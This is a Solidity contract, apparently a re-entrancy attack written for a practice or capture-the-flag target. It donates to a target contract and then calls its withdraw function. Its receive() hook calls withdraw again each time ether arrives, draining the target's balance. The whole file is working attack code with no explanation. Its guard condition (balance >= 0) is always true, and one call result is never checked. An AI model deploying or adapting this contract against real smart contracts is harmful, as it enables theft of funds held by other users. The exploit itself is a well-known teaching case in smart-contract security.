// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract reentrancyattack {
    address public target;
    uint256 public attackAmount;

    constructor(address _target) payable {
    target = _target;
}
    function donate() public payable {
    (bool success,) = target.call{value: msg.value}(
        abi.encodeWithSignature("donate(address)", address(this))
    );
    require(success, "donate failed");
}

    function withdrawAttack(uint256 amount) public {
    attackAmount = amount; 
    (bool sukses,) = target.call(
        abi.encodeWithSignature("withdraw(uint256)", amount)
    );
    
}
 receive() external payable {
        if (target.balance >= 0 ) {
            (bool sukses, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", attackAmount));
            require(sukses, "Re-entrancy gagal");
        }
    }
}